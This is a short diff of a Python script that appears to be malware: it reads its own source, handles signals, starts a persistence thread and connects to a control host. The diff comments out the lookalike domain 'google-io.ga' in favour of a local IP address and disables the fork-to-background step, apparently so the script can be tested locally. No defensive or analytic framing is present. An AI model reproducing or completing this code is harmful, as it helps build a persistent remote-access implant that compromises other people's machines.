@@ -13,7 +13,8 @@ import threading
 USER = os.environ.get('USER', 'unknown')
 BUFFER_SIZE = 1025
 PORT = 8080
-DNS = 'google-io.ga'
+# DNS = 'google-io.ga'
+DNS = '192.168.2.69'
 
 SCRIPT_PATH = os.path.realpath(__file__)
 SCRIPT_CONTENT = (open(SCRIPT_PATH, 'r')).read()
@@ -74,12 +75,12 @@ def handle_signals():
             pass
 
 def main(*_, **__):
-    if os.fork() == 0:
+    # if os.fork() == 0:
         handle_signals()
         threading.Thread(target=persist_file).start()
         connect_to_host()
-    else:
-        sys.exit(0)
+    # else:
+    #     sys.exit(0)
 
 if __name__ == '__main__':
     main()
